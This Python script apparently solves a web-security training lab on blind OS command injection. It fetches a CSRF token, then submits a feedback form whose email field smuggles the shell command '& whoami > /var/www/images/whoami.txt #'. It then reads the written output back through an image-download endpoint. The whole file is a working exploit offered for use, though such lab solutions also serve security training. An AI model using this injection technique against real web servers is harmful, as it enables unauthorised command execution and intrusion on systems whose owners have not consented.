# Lab: Blind OS command injection with output redirection
import sys
import urllib3
import urllib.parse
import requests
import os
from bs4 import BeautifulSoup
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
}


def get_csrf_token(s, url):
    path = "/feedback"
    r = s.get(url + path, verify=False, proxies=proxies)

    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    if csrf_token:
        print(csrf_token)
        return csrf_token
    else:
        print("(-) Couldn't find csrf token")


def get_content(s, url):
    path = "/image?filename=whoami.txt"
    r = s.get(url + path, verify=False, proxies=proxies)
    if r.status_code == 200:
        print("(-> Injection successfully executed !")
        print(r.text)
    else:
        print(f"(-) Couldn't get content from {path}")
        exit(1)



def os_command_injection(s, url):
    stock_path = "/feedback/submit"
    command_injection = "1337@1337.org & whoami > /var/www/images/whoami.txt #"
    command_injection_encoded = urllib.parse.quote(command_injection)
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "name": '1', "email": command_injection_encoded, "subject": "adafa", "message": "gsgsg"}
    r = s.post(url + stock_path, data=data, verify=False, proxies=proxies)

    if r.status_code == 200:
        get_content(s, url)
    else:
        print(f"(-) Could not execute {command_injection} injection")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(-> Blind OS command injection with output redirection...")
    s = requests.Session()
    os_command_injection(s, url)


if __name__ == "__main__":
    main()
